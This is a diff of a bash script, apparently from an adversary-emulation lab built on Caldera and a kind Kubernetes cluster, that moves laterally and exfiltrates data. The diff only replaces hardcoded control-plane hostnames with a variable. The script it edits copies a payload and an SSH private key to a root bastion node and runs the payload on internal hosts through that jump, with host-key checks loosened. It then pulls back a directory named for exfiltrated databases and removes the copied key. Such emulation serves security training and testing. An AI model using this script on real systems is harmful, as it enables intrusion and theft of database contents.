@@ -4,7 +4,7 @@ set -euo pipefail
 # ========== CONFIG ==========
 # Bastion
 BASTION_USER="root"
-BASTION_HOST="$CLUSTER_NAME-control-plane"
+BASTION_HOST="$CONTROL_PLANE_NODE"
 BASTION_PORT="122"
 # Internal targets
 TARGET_USER="root"
@@ -148,14 +148,14 @@ if [[ -s "$HOSTS_FILE" ]]; then
       "${SSH_JUMP_OPTS[@]}"
 
     # Executing exfiltration from DBs
-    scp -i "$SSH_KEY" -P 122 "/opt/caldera/KC4/container-admin1.sh" root@kind-cluster-control-plane:/tmp/container-admin1.sh
-    scp -i "$SSH_KEY" -P 122 "$SSH_KEY" root@kind-cluster-control-plane:/tmp/key
-    ssh -i "$SSH_KEY" -n -p 122 root@kind-cluster-control-plane 'chmod +x /tmp/container-admin1.sh'
+    scp -i "$SSH_KEY" -P 122 "/opt/caldera/KC4/container-admin1.sh" root@$CONTROL_PLANE_NODE:/tmp/container-admin1.sh
+    scp -i "$SSH_KEY" -P 122 "$SSH_KEY" root@$CONTROL_PLANE_NODE:/tmp/key
+    ssh -i "$SSH_KEY" -n -p 122 root@$CONTROL_PLANE_NODE 'chmod +x /tmp/container-admin1.sh'
     echo "Run script in pod"
-    ssh -i $SSH_KEY -p 122 -n root@kind-cluster-control-plane "ssh -i /tmp/key -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -p 122 root@$ip '/usr/bin/env bash -s -- 1' < /tmp/container-admin1.sh"
+    ssh -i $SSH_KEY -p 122 -n root@$CONTROL_PLANE_NODE "ssh -i /tmp/key -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -p 122 root@$ip '/usr/bin/env bash -s -- 1' < /tmp/container-admin1.sh"
     fetch_dir "$TARGET_USER" "$ip" "$TARGET_PORT" "$tag" "/tmp/exfiltration/dbs" \
       "${SSH_JUMP_OPTS[@]}"
-    ssh -i "$SSH_KEY" -p 122 -n root@kind-cluster-control-plane 'rm -f /tmp/key'
+    ssh -i "$SSH_KEY" -p 122 -n root@$CONTROL_PLANE_NODE 'rm -f /tmp/key'
       
   done < "$HOSTS_FILE"
 else
